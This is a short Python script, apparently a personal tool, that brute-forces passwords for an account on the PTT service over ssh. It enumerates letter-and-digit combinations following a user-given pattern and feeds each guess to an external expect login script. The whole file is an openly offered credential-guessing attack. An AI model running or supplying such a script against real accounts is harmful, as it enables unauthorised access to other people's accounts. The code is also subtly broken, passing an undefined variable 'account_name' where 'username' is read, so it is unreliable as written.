#!/usr/bin/env python
"""Brute force password trial on PTT account via ssh.
Usage:
    python attack.py username 5a3n

    '5a3n' means first 5 are alphabets and last 3 are numerics.
    The script is only tested in Python 3.
"""

import sys
import subprocess
import string
from itertools import product, chain


def combo_iter(pattern):

    ENG = string.ascii_lowercase
    NUM = [str(i) for i in range(10)]

    def combo(type, len):
        len = int(len)
        if type == 'a':
            src = ENG
        elif type == 'n':
            src = NUM
        return  product(src, repeat=len)

    part_1_combo = combo(pattern[1], pattern[0])
    part_2_combo = combo(pattern[3], pattern[2])
    return product(part_1_combo, part_2_combo)


if __name__ == '__main__':
    username = sys.argv[1]
    combo_pattern = sys.argv[2]
    log_name = 'log_{}.txt'.format(combo_pattern)
    cnt = 0  # Global number of trials.
    for combo in combo_iter(combo_pattern):
        cnt += 1
        pw = ''.join(list(chain(*combo)))
        cmd = ['/usr/bin/expect', 'login.exp', account_name, pw, log_name]
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE)
        out, err = p.communicate()
        print('\rTrial no.{} with {}'.format(cnt, pw), end='', flush=True)
